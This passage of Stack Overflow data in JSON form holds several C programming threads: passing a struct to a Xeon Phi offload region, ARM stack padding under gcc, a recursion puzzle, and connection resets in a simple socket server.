"https://stackoverflow.com/users/648265/ivan-pozdeev"}, "edited": false, "score": 0, "creation_date": 1449721205, "post_id": 34186691, "comment_id": 56133337, "body": "From what I found about <code>#pragma offload</code>, <a href=\"http://xyproblem.info/\" rel=\"nofollow noreferrer\">you&#39;d better tell us what you&#39;re trying to do as there may be a better solution</a>."}, {"owner": {"reputation": 1216, "user_id": 2202368, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/7f6a3628ca711a433326420a2ccaa371?s=128&d=identicon&r=PG", "display_name": "jabk", "link": "https://stackoverflow.com/users/2202368/jabk"}, "reply_to_user": {"reputation": 28384, "user_id": 648265, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/4d98e414a47934d66cb78bf73d0845ba?s=128&d=identicon&r=PG", "display_name": "ivan_pozdeev", "link": "https://stackoverflow.com/users/648265/ivan-pozdeev"}, "edited": false, "score": 0, "creation_date": 1450039481, "post_id": 34186691, "comment_id": 56253839, "body": "I&#39;m drawing the Mandelbrot&#39;s series and I need to parallelize the drawing loop. From what I gathered, I can&#39;t pass the struct because the <code>A-&gt;*member* </code> is solved during compile time"}, {"owner": {"reputation": 28384, "user_id": 648265, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/4d98e414a47934d66cb78bf73d0845ba?s=128&d=identicon&r=PG", "display_name": "ivan_pozdeev", "link": "https://stackoverflow.com/users/648265/ivan-pozdeev"}, "edited": false, "score": 0, "creation_date": 1450052444, "post_id": 34186691, "comment_id": 56257689, "body": "&quot;can&#39;t pass the struct (where?) because the A-&gt;*member*...&quot; doesn&#39;t tell me much, if anything. <a href=\"http://stackoverflow.com/help/how-to-ask\">stackoverflow.com/help/how-to-ask</a> There are no telepaths here, don&#39;t assume we know anything about your situation."}], "answers": [{"tags": [], "owner": {"reputation": 1306, "user_id": 2807749, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3884afad2069925c2c0ca50d49e4b093?s=128&d=identicon&r=PG&f=1", "display_name": "user0815", "link": "https://stackoverflow.com/users/2807749/user0815"}, "is_accepted": true, "score": 1, "last_activity_date": 1450520161, "creation_date": 1450520161, "answer_id": 34369588, "question_id": 34186691, "link": "https://stackoverflow.com/questions/34186691/how-to-pass-struct-to-offload-in-xeon-phi/34369588#34369588", "title": "How to pass struct to offload in Xeon Phi", "body": "<p>Your first attempt fails because the structure is not bitwise copyable. In fact, it is not allowed to transfer a structure that contains pointers. With the second approach, the compiler cannot match the member variables since <code>A</code> is not available on the accelerator. You can solve the problem by extracting the members beforehand and use individual variables instead.</p>\n\n<pre><code>struct S {\n   int firstInt;\n   int secondInt;\n   int *intPointer;\n};\n</code></pre>\n\n<p>Assuming you have an instance <code>A</code> of the structure above, you can do the following.</p>\n\n<pre><code>int first = A.firstInt;\nint second = A.secondInt;\nint *pointer = A.intPointer;\n</code></pre>\n\n<p>Afterwards, you can use the individual variables inside of the offload region.</p>\n\n<pre><code>#pragma offload target(mic: 0) in(first, second) \n                               inout(pointer:length(first*second))\n{\n   /* Use individual variables here. */\n}\n</code></pre>\n\n<p>Make sure to allocate memory on the device before copying the data referred by <code>pointer</code>.</p>\n\n<p>Alternatively, you can exclude the pointer from your structure and pass it as a separate variable. This way you can copy the entire structure (which is now bitwise copyable) and the pointer individually.</p>\n\n<pre><code>#pragma offload target(mic: 0) in(A) inout(pointer:length(A.first*A.second))\n</code></pre>\n"}], "owner": {"reputation": 1216, "user_id": 2202368, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/7f6a3628ca711a433326420a2ccaa371?s=128&d=identicon&r=PG", "display_name": "jabk", "link": "https://stackoverflow.com/users/2202368/jabk"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 345, "favorite_count": 0, "accepted_answer_id": 34369588, "answer_count": 1, "score": 4, "last_activity_date": 1450520161, "creation_date": 1449686943, "last_edit_date": 1449691934, "question_id": 34186691, "link": "https://stackoverflow.com/questions/34186691/how-to-pass-struct-to-offload-in-xeon-phi", "title": "How to pass struct to offload in Xeon Phi", "body": "<p>I have a <code>struct A</code> with a few <code>int</code> and one <code>int *</code> member. How can I use this in offload?</p>\n\n<p>I probably can't do <code>#pragma offload target(mic: 0) inout(A){}</code>..., but what about</p>\n\n<p><code>#pragma offload target(mic: 0) in(A-&gt;firstInt, A-&gt;secondInt) inout(A-&gt;intPointer:length(A-&gt;firstInt*A-&gt;secondInt)){}</code></p>\n\n<p>but I when I tried this I got <code>error: invalid entity for this variable list in offload clause</code> in response when compiling</p>\n"}, {"tags": ["c", "assembly", "stack", "arm"], "comments": [{"owner": {"reputation": 27697, "user_id": 4433386, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/hbHEL.png?s=128&g=1", "display_name": "Marcus M&#252;ller", "link": "https://stackoverflow.com/users/4433386/marcus-m%c3%bcller"}, "edited": false, "score": 0, "creation_date": 1449686211, "post_id": 34186412, "comment_id": 56119216, "body": "stupid question, a stab at the dark: if you remove the &quot;volatile&quot;, and make use of <code>a</code> so it doesn&#39;t get compiled away, is it the same?"}, {"owner": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 5, "creation_date": 1449686227, "post_id": 34186412, "comment_id": 56119228, "body": "Note that gcc does a lot of very naive stuff when you do not enable optimizations."}, {"owner": {"reputation": 52454, "user_id": 547981, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90042f6f33a9f87769fac02096ceea68?s=128&d=identicon&r=PG", "display_name": "Jester", "link": "https://stackoverflow.com/users/547981/jester"}, "edited": false, "score": 0, "creation_date": 1449686342, "post_id": 34186412, "comment_id": 56119282, "body": "Yes, you should use <code>-O3</code> and then change <code>return 0;</code> to <code>return a;</code> so that it&#39;s not optimized away. You will see 8 bytes allocated."}, {"owner": {"reputation": 818, "user_id": 3688293, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/044211651200793b2656b9942e7cbe89?s=128&d=identicon&r=PG&f=1", "display_name": "Martin", "link": "https://stackoverflow.com/users/3688293/martin"}, "reply_to_user": {"reputation": 27697, "user_id": 4433386, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/hbHEL.png?s=128&g=1", "display_name": "Marcus M&#252;ller", "link": "https://stackoverflow.com/users/4433386/marcus-m%c3%bcller"}, "edited": false, "score": 0, "creation_date": 1449686657, "post_id": 34186412, "comment_id": 56119465, "body": "@MarcusM&#252;ller Yes. I also tried what Jester suggested, and it just compiles to <code>movs r0, #0</code>. gcc seems to get way smarter with optimizations on."}, {"owner": {"reputation": 27697, "user_id": 4433386, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/hbHEL.png?s=128&g=1", "display_name": "Marcus M&#252;ller", "link": "https://stackoverflow.com/users/4433386/marcus-m%c3%bcller"}, "edited": false, "score": 0, "creation_date": 1449686743, "post_id": 34186412, "comment_id": 56119525, "body": "what happens with <code>-Os</code> ?"}, {"owner": {"reputation": 818, "user_id": 3688293, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/044211651200793b2656b9942e7cbe89?s=128&d=identicon&r=PG&f=1", "display_name": "Martin", "link": "https://stackoverflow.com/users/3688293/martin"}, "edited": false, "score": 0, "creation_date": 1449686770, "post_id": 34186412, "comment_id": 56119540, "body": "Another try: I removed the <code>volatile</code> and used <code>return a</code>. It&#39;ll allocate 8 bytes, but it won&#39;t push r7."}, {"owner": {"reputation": 818, "user_id": 3688293, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/044211651200793b2656b9942e7cbe89?s=128&d=identicon&r=PG&f=1", "display_name": "Martin", "link": "https://stackoverflow.com/users/3688293/martin"}, "reply_to_user": {"reputation": 27697, "user_id": 4433386, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/hbHEL.png?s=128&g=1", "display_name": "Marcus M&#252;ller", "link": "https://stackoverflow.com/users/4433386/marcus-m%c3%bcller"}, "edited": false, "score": 0, "creation_date": 1449686860, "post_id": 34186412, "comment_id": 56119595, "body": "@MarcusM&#252;ller <code>-Os</code> does <code>movs r0, #0</code>."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449687050, "post_id": 34186412, "comment_id": 56119722, "body": "The compiler is still allowed to remove this <code>volatile</code>, as it can guarantee it sees no global scope and you do not even access it."}, {"owner": {"reputation": 52454, "user_id": 547981, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90042f6f33a9f87769fac02096ceea68?s=128&d=identicon&r=PG", "display_name": "Jester", "link": "https://stackoverflow.com/users/547981/jester"}, "edited": false, "score": 0, "creation_date": 1449687680, "post_id": 34186412, "comment_id": 56120091, "body": "Why do you care about pushing <code>r7</code> anyway? If it&#39;s not used, it doesn&#39;t need to be pushed. You can force it using <code>-O3 -fno-omit-frame-pointer</code> and then the 12 bytes come back. Now that&#39;s interesting :)"}, {"owner": {"reputation": 818, "user_id": 3688293, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/044211651200793b2656b9942e7cbe89?s=128&d=identicon&r=PG&f=1", "display_name": "Martin", "link": "https://stackoverflow.com/users/3688293/martin"}, "reply_to_user": {"reputation": 52454, "user_id": 547981, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90042f6f33a9f87769fac02096ceea68?s=128&d=identicon&r=PG", "display_name": "Jester", "link": "https://stackoverflow.com/users/547981/jester"}, "edited": false, "score": 0, "creation_date": 1449687862, "post_id": 34186412, "comment_id": 56120192, "body": "@Jester I don&#39;t care. The compiler does. I just want to know why, if it chooses to push r7, it also adds 4 extra bytes of padding to it."}, {"owner": {"reputation": 818, "user_id": 3688293, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/044211651200793b2656b9942e7cbe89?s=128&d=identicon&r=PG&f=1", "display_name": "Martin", "link": "https://stackoverflow.com/users/3688293/martin"}, "reply_to_user": {"reputation": 52454, "user_id": 547981, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90042f6f33a9f87769fac02096ceea68?s=128&d=identicon&r=PG", "display_name": "Jester", "link": "https://stackoverflow.com/users/547981/jester"}, "edited": false, "score": 0, "creation_date": 1449688090, "post_id": 34186412, "comment_id": 56120314, "body": "@Jester I tried -O3 -fno-omit-frame-pointer and it pushes r7, but it doesn&#39;t move SP at all. Since the ARM EABI requires the stack to be 8-byte aligned, does this violate the ABI?"}, {"owner": {"reputation": 18029, "user_id": 3156750, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73e00c291e7b746a34f28622a64f0492?s=128&d=identicon&r=PG&f=1", "display_name": "Notlikethat", "link": "https://stackoverflow.com/users/3156750/notlikethat"}, "edited": false, "score": 0, "creation_date": 1449688981, "post_id": 34186412, "comment_id": 56120786, "body": "@Martin no, as a leaf function it doesn&#39;t actually matter - the ABI only <i>requires</i> 8-byte stack alignment across a function call. Consider, though, if you weren&#39;t optimising (so leaving the stack 8-byte aligned at all times because you don&#39;t know if you&#39;re going to make a call later), and were to perform the &quot;preserve 4 bytes of callee-saved registers&quot; and &quot;make 1 byte of space for local variables&quot; as completely separate steps..."}, {"owner": {"reputation": 818, "user_id": 3688293, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/044211651200793b2656b9942e7cbe89?s=128&d=identicon&r=PG&f=1", "display_name": "Martin", "link": "https://stackoverflow.com/users/3688293/martin"}, "reply_to_user": {"reputation": 18029, "user_id": 3156750, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73e00c291e7b746a34f28622a64f0492?s=128&d=identicon&r=PG&f=1", "display_name": "Notlikethat", "link": "https://stackoverflow.com/users/3156750/notlikethat"}, "edited": false, "score": 0, "creation_date": 1449689268, "post_id": 34186412, "comment_id": 56120945, "body": "@Notlikethat yeah, that&#39;s what I thought as well. The only way it makes sense is if those are separate steps. Unfortunately I don&#39;t know much about gcc internals, so I can&#39;t check it by myself."}, {"owner": {"reputation": 18029, "user_id": 3156750, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73e00c291e7b746a34f28622a64f0492?s=128&d=identicon&r=PG&f=1", "display_name": "Notlikethat", "link": "https://stackoverflow.com/users/3156750/notlikethat"}, "edited": false, "score": 0, "creation_date": 1449689485, "post_id": 34186412, "comment_id": 56121072, "body": "The take-away lesson is: never try to reason about <i>unoptimised</i> GCC code, just have a good laugh at such marvels as spilling a register to the stack between statements, immediately reloading that value back into the <i>same</i> register, then never using it ;)"}, {"owner": {"reputation": 14469, "user_id": 2191105, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/tPiCW.png?s=128&g=1", "display_name": "David Hoelzer", "link": "https://stackoverflow.com/users/2191105/david-hoelzer"}, "edited": false, "score": 0, "creation_date": 1449697420, "post_id": 34186412, "comment_id": 56125422, "body": "The most likely explanation is stack alignment requirements. See <a href=\"http://stackoverflow.com/questions/4175281/what-does-it-mean-to-align-the-stack\">here</a>"}], "answers": [{"tags": [], "owner": {"reputation": 22874, "user_id": 3282056, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/IXonK.jpg?s=128&g=1", "display_name": "rcgldr", "link": "https://stackoverflow.com/users/3282056/rcgldr"}, "is_accepted": false, "score": 1, "last_activity_date": 1449710325, "last_edit_date": 1449710325, "creation_date": 1449694409, "answer_id": 34188756, "question_id": 34186412, "link": "https://stackoverflow.com/questions/34186412/arm-why-does-gcc-allocate-12-bytes-for-a-single-char/34188756#34188756", "title": "ARM - Why does gcc allocate 12 bytes for a single char?", "body": "<p>In C / C++, on a 32/64 bit machine,  8 bit or 16 bit parameters are passed as 32 bit parameters (maybe 64 bit on some 64 bit machines). The called function then only uses the lower 8 or 16 bits of the 32 bit parameters. Some (or most) 32/64 bit processors don't have or use a push byte or push short for stack operations. If using a fast call API, then 32 bit or 64 bit registers will be used for the first few parameters.</p>\n\n<p>The example assembly code may be aligning the stack to a 16 byte boundary, or it may be doing a default allocation for local variables or debugger use of the stack. </p>\n"}], "owner": {"reputation": 818, "user_id": 3688293, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/044211651200793b2656b9942e7cbe89?s=128&d=identicon&r=PG&f=1", "display_name": "Martin", "link": "https://stackoverflow.com/users/3688293/martin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 279, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1449710325, "creation_date": 1449685878, "question_id": 34186412, "link": "https://stackoverflow.com/questions/34186412/arm-why-does-gcc-allocate-12-bytes-for-a-single-char", "title": "ARM - Why does gcc allocate 12 bytes for a single char?", "body": "<p>I have the following code:</p>\n\n<pre><code>int main()\n{\n    volatile char a;\n\n    return 0;\n}\n</code></pre>\n\n<p>When I disassemble it with <code>arm-linux-gnueabihf-gcc -o align.txt -O0 -S align.c</code> I get the following:</p>\n\n<pre><code>push    {r7}\nsub sp, sp, #12\n...\n</code></pre>\n\n<p>Now, I know the ARM EABI requires the stack to be 8-byte aligned, which would explain gcc allocating some more space than the single byte required by <code>a</code>. However, I'd have thought it'd allocate 4 bytes to make room for <code>a</code> and 3 padding bytes.</p>\n\n<p>It looks like it's allocating 4 bytes to make the pushed r7 aligned, then another 8 (1 for <code>a</code> and 7 for padding). If I define a 9-member char array instead, it'll allocate 20 bytes.</p>\n\n<p>Why does the pushed r7 need its own padding?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 4232, "user_id": 5281962, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a29ae5ecb74bea23afa60d940edc0282?s=128&d=identicon&r=PG&f=1", "display_name": "Cherubim", "link": "https://stackoverflow.com/users/5281962/cherubim"}, "edited": false, "score": 2, "creation_date": 1449685952, "post_id": 34186375, "comment_id": 56119053, "body": "Hey! I see no main function?!?"}, {"owner": {"reputation": 533, "user_id": 5613000, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d21885cdf3eab3a31152c12315051c78?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan Fitzpatrick", "link": "https://stackoverflow.com/users/5613000/ryan-fitzpatrick"}, "edited": false, "score": 0, "creation_date": 1449686896, "post_id": 34186375, "comment_id": 56119623, "body": "watch how many times FunctionCalled is printed when you pass -2 :)"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449687632, "post_id": 34186375, "comment_id": 56120054, "body": "Why not ask your teacher? It is <b>his</b> job to explain. Find out yourself by using a debugger and single-step."}, {"owner": {"reputation": 301, "user_id": 5592597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EeuPy.jpg?s=128&g=1", "display_name": "ibrahimijc", "link": "https://stackoverflow.com/users/5592597/ibrahimijc"}, "edited": false, "score": 0, "creation_date": 1449687726, "post_id": 34186375, "comment_id": 56120118, "body": "Yess That&#39;s running infinitely!"}, {"owner": {"reputation": 301, "user_id": 5592597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EeuPy.jpg?s=128&g=1", "display_name": "ibrahimijc", "link": "https://stackoverflow.com/users/5592597/ibrahimijc"}, "edited": false, "score": 0, "creation_date": 1449687826, "post_id": 34186375, "comment_id": 56120174, "body": "Why my value of n increasing after every return n statement ?  The teacher isn&#39;t available ."}, {"owner": {"reputation": 533, "user_id": 5613000, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d21885cdf3eab3a31152c12315051c78?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan Fitzpatrick", "link": "https://stackoverflow.com/users/5613000/ryan-fitzpatrick"}, "edited": false, "score": 0, "creation_date": 1449688291, "post_id": 34186375, "comment_id": 56120424, "body": "@Mr.X lets say you call the function with n=3, you will continuously add n-1 to the stack until you reach -1, so your stack becomes (simplified) 3-2-1-0-(-1), as you return the values get popped off the stack, so you return (-1) then 0 then 1 then 2 then 3"}, {"owner": {"reputation": 301, "user_id": 5592597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EeuPy.jpg?s=128&g=1", "display_name": "ibrahimijc", "link": "https://stackoverflow.com/users/5592597/ibrahimijc"}, "reply_to_user": {"reputation": 533, "user_id": 5613000, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d21885cdf3eab3a31152c12315051c78?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan Fitzpatrick", "link": "https://stackoverflow.com/users/5613000/ryan-fitzpatrick"}, "edited": false, "score": 0, "creation_date": 1449695148, "post_id": 34186375, "comment_id": 56124233, "body": "@RyanFitzpatrick . That was really helpful sir . Thank you!"}], "answers": [{"comments": [{"owner": {"reputation": 301, "user_id": 5592597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EeuPy.jpg?s=128&g=1", "display_name": "ibrahimijc", "link": "https://stackoverflow.com/users/5592597/ibrahimijc"}, "edited": false, "score": 0, "creation_date": 1449687780, "post_id": 34186441, "comment_id": 56120150, "body": "Why my value of n increasing after every return n statement ?"}, {"owner": {"reputation": 407, "user_id": 4068471, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/mQsU1.jpg?s=128&g=1", "display_name": "Kevin Minehart", "link": "https://stackoverflow.com/users/4068471/kevin-minehart"}, "reply_to_user": {"reputation": 301, "user_id": 5592597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EeuPy.jpg?s=128&g=1", "display_name": "ibrahimijc", "link": "https://stackoverflow.com/users/5592597/ibrahimijc"}, "edited": false, "score": 0, "creation_date": 1449691980, "post_id": 34186441, "comment_id": 56122491, "body": "@Mr.X @Ryan.Fitzpatrick explained it pretty well above.  Run through it step by step.  It&#39;s decreasing each time (or appearing as such) because you&#39;re calling <code>display</code> with n-1 recursively, so it&#39;s going to display *s for each <code>n</code>, starting with <code>n</code>, then <code>n-1</code>, then <code>(n -1) -1</code>, etc. until <code>n - 1</code> is equal to <code>-1</code>."}, {"owner": {"reputation": 301, "user_id": 5592597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EeuPy.jpg?s=128&g=1", "display_name": "ibrahimijc", "link": "https://stackoverflow.com/users/5592597/ibrahimijc"}, "edited": false, "score": 0, "creation_date": 1449695269, "post_id": 34186441, "comment_id": 56124292, "body": "! Thank you so much !"}], "tags": [], "owner": {"reputation": 407, "user_id": 4068471, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/mQsU1.jpg?s=128&g=1", "display_name": "Kevin Minehart", "link": "https://stackoverflow.com/users/4068471/kevin-minehart"}, "is_accepted": true, "score": 1, "last_activity_date": 1449686045, "creation_date": 1449686045, "answer_id": 34186441, "question_id": 34186375, "link": "https://stackoverflow.com/questions/34186375/related-to-function-and-recursion/34186441#34186441", "title": "Related to function and recursion", "body": "<p>When the application is first called in your main function, it expects a return value.  Unless the <code>n</code> that you pass to it is -1, the lines following the self-invoked function will happen once because it is called in <code>main</code> and has to reach the end of the function.  When the self-invoked function returns a number, that doesn't end the function call to <code>display</code> in <code>main</code>, the last <code>return n;</code> in your <code>else</code> block does.</p>\n\n<p>Recursion is easiest to understand when followed step-by-step.  So I would recommend doing that to fully understand it.</p>\n"}], "owner": {"reputation": 301, "user_id": 5592597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EeuPy.jpg?s=128&g=1", "display_name": "ibrahimijc", "link": "https://stackoverflow.com/users/5592597/ibrahimijc"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 53, "favorite_count": 0, "accepted_answer_id": 34186441, "answer_count": 1, "score": -4, "last_activity_date": 1449686045, "creation_date": 1449685748, "last_edit_date": 1449685869, "question_id": 34186375, "link": "https://stackoverflow.com/questions/34186375/related-to-function-and-recursion", "title": "Related to function and recursion", "body": "<p>This is a code by my teacher for printing pattern using recursion.\nWhy is \"Are you Here \" printed ? I can't understand the outer loop. Please Help!</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\nint display (int n)\n{   \n\n    printf(\"\\nFunctionCalled\\n\");\n    if (n==-1)\n    {\n        return n;\n    }\n\n    else \n    {   \n\n        display (n-1);\n\n\n         printf(\"Are You Here \");\n\n\n        for (int i=0;i&lt;=n;i++)\n        {\n            printf(\"*\");\n        }\n\n        printf(\"\\n\");\n\n        return n;    // where is this value being returned ??\n\n    }\n\n}\n</code></pre>\n"}, {"tags": ["c", "sockets", "server"], "comments": [{"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1449686191, "post_id": 34186332, "comment_id": 56119195, "body": "The http RFCs (specifications) are here: <a href=\"http://www.w3.org/Protocols/\" rel=\"nofollow noreferrer\">w3.org/Protocols</a> (7230 to 7235)"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1449686230, "post_id": 34186332, "comment_id": 56119230, "body": "Also you want to make one SO question per one of YOUR questions."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 1, "creation_date": 1449686386, "post_id": 34186332, "comment_id": 56119313, "body": "Also^2 be aware that <code>read()</code>ing from a socket does not necessarily return as much bytes as requested, but few. The numbers of reads does <i>not</i> need to match to the number of writes. Read the documentation closely."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1449686502, "post_id": 34186332, "comment_id": 56119377, "body": "And last not least for doing yourself a favour <i>always</i> test the outcome of function calls, at least in case they return any value relevant to the following code."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 1, "creation_date": 1449686640, "post_id": 34186332, "comment_id": 56119452, "body": "A detail: Do not do <code>int c; ... ... (socklen_t*) &amp;c);</code>, but just <code>socklen_t c; ... ... &amp;c);</code>. Imaging what would happen if <code>int</code> would be of different size then <code>socklen_t</code>."}, {"owner": {"reputation": 4445, "user_id": 560903, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d66cec4f7bd065097137c2001c96b866?s=128&d=identicon&r=PG", "display_name": "keithmo", "link": "https://stackoverflow.com/users/560903/keithmo"}, "reply_to_user": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1449696242, "post_id": 34186332, "comment_id": 56124793, "body": "One common cause of &quot;connection reset&quot; is closing a socket with unread data still buffered. This could be caused by the &quot;recv() can return partial data issue&quot; that @alk mentioned."}], "answers": [{"tags": [], "owner": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "is_accepted": false, "score": 0, "last_activity_date": 1505890661, "creation_date": 1505890661, "answer_id": 46315230, "question_id": 34186332, "link": "https://stackoverflow.com/questions/34186332/socket-server-send-data-to-client/46315230#46315230", "title": "socket server - send data to client", "body": "<blockquote>\n  <p>When I read html file and send it to client. If file is large data are\n  not send and browser reset connection <code>The connection was reset</code> How\n  can i wait until all data are send? in this loop.</p>\n</blockquote>\n\n<p>While the loop you refer to has potential problems, there is likely not the answer to your question.<br>\nI could reproduce the issue with your code, and after some searching hit on the highly interesting post <a href=\"https://blog.netherlabs.nl/articles/2009/01/18/the-ultimate-so_linger-page-or-why-is-my-tcp-not-reliable\" rel=\"nofollow noreferrer\"><em>The ultimate SO_LINGER page, or: why is my tcp not reliable</em></a>. The key part is this sentence from <a href=\"http://www.freesoft.org/CIE/RFC/1122/99.htm\" rel=\"nofollow noreferrer\">section 4.2.2.13 of RFC 1122</a>:</p>\n\n<blockquote>\n  <p>If such a host issues a CLOSE call while received data is still\n  pending in TCP, or if new data is received after CLOSE is called, its\n  TCP SHOULD send a RST to show that data was lost.</p>\n</blockquote>\n\n<p>Your program may (and in my tests, does) indeed have received data pending, because at the start of the conversation it calls <code>read(client_socketfd, sprava, 255)</code>, thus, if the HTTP GET request is longer than 255 bytes, leaving part of the request pending to be read. Now at the end after all send data has been submitted to the OS by <code>write</code>, when <code>close</code> is called, the pending data is still there, and therefore the OS, by sending the mandated RST, aborts the connection <em>immediately</em>, possibly discarding any not yet transmitted send data in its buffers. So, we have the surprising situation that an omission to receive in the beginning leads to loss of transmit data in the end.<br>\nA quick and dirty fix would be to increase the size of <code>sprava</code> and the number of bytes to <code>read</code> so that the whole request is read - but what might be the maximum length of a request? The correct way is to <code>read</code> in a loop until the request is terminated by an empty line consisting of only <code>\\r\\n</code>. </p>\n"}], "owner": {"reputation": 27, "user_id": 3535132, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c129c89aa16879c5fcf0d173b77699f9?s=128&d=identicon&r=PG&f=1", "display_name": "salian", "link": "https://stackoverflow.com/users/3535132/salian"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1360, "favorite_count": 1, "answer_count": 1, "score": 0, "last_activity_date": 1505890661, "creation_date": 1449685615, "question_id": 34186332, "link": "https://stackoverflow.com/questions/34186332/socket-server-send-data-to-client", "title": "socket server - send data to client", "body": "<p>I make server in c by socket. Client send request to server. Server parse it and send back data (html,png,jpg or bash script output). I have some questions about it.</p>\n\n<p>When I read html file and send it to client. If file is large data are not send and browser reset connection <code>The connection was reset</code> How can i wait until all data are send? in this loop.</p>\n\n<pre><code>while ((ret = read(html, buff, 1023)) &gt; 0)\n{\n    write(client_socketfd, buff, ret);\n}\n</code></pre>\n\n<p>Is it possible to send image(png or jpg) same way like html, only change Content type in html header?</p>\n\n<p>How it works if in html file  are a tags with src=\"another.html\" after click on it client send GET request?</p>\n\n<p>How it works if in html file are img tags?</p>\n\n<p>Last question what is the best way to close infinity loop server. In linux if I close it with <code>CTRL C</code> socket are not close.</p>\n\n<p>If something else is wrong I will be grateful for your advice.</p>\n\n<pre><code>int main(int argc, char *argv[])\n{\n    int result;\n    int socket_desc, client_socketfd, c, read_size, buffer = 0;\n    struct sockaddr_in server, client;\n    char sprava[256];\n\n    int arg;\n\n    int port = 0;\n    char 